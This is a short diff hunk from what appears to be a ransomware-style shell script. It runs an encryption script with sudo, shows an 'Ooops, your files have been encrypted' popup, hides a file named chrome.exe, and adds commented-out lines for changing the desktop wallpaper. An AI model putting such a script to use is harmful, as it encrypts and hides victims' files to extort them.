@@ -7,6 +7,9 @@ sudo bash encrypt.sh
 
 cd ..
 
+## This is a line to change the background to a file of your choosing, change the path to your own choice
+##gsettings set org.gnome.desktop.background picture-uri file:///root/Downloads/1025.jpg
+
 xmessage "$(printf "Ooops"!"\nYour Files have been encrypted"!"")"
 
 mv chrome.exe .chrome.exe
